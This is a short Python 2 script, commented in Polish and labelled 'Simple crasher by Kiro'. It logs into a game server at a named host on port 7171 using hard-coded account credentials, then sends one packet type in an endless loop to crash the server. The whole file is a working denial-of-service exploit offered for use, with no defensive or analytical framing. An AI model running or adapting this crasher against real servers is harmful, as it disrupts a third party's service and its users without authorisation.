#!/usr/bin/env python
# -*- encoding=utf8 -*-
__author__ = 'Piotr "Kiro" Karkut'
__license__ = "BSD"

import socket
from struct import *
from time import sleep
import os
## IP, Account name, Password, Character Name
dane = ("selora.eu",123432,"lol123","Kiro")

def addMessageLenght(msg):
    retLen = len(msg);
    ret = msg
    ret = chr(retLen % 256)+chr(retLen / 256) + ret
    return ret

def addString(str):
    strLen = len(str)
    ret = chr(strLen % 256)+chr(strLen / 256) + str
    return ret
    
def getU32(num):
    return pack("<l",num)
    # sending login packet with acc name char name and password and finally compiling the message into the whole thing
    # could also be msg += addString etc? right? Gonna test it soon 
def getLoginPacket(num, pswdm, char):
    msg = chr(0x0A)+chr(0x02)+chr(0x00)+chr(0xF8)+chr(0x02)+chr(0x00)
    msg = msg + getU32(num)
    msg = msg + addString(char)
    msg = msg + addString(pswdm)
    msg = addMessageLenght(msg)
    return msg
    # create socket and connect to server with print that it is connecting and index of tab[0] IP being connected to
def kill(tab):
    print u">    Łączenie do", tab[0]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((tab[0], 7171))
    ##send login information acc[1] pass[2] charname[3]
    print ">>   Logowanie"
    s.send(getLoginPacket(tab[1],tab[2],tab[3]))
    sleep(1)
    #accept the response and check whether we got failed login and return printed string if so
    re = s.recv(1024)
    if len(re) == 0 or re[2] == 0x14:
        print u"::Twoja postać jest już zalogowana, zbanowana, dane są nieprawidłowe lub coś jeszcze innego"
        return
    #send houseParseWindow if logged in successfuly
    print ">>>  ATAK"
    while True:
      s.send(addMessageLenght(chr(0xA7)))    
    sleep(1)
    #close connection and finalize script
    print u">>>> Rozłączenie"
    s.close()
    print "::Atak przeprowadzony"
##initialize the script and except if it is wrong ip or our firewall is blocked or connection is failed in any other way.
if __name__ == "__main__":    
    os.system("cls")
    print "::Simple crasher by Kiro\n"
    try:
        kill(dane)
    except socket.error:
        print u"::Nie można się połączyć!"
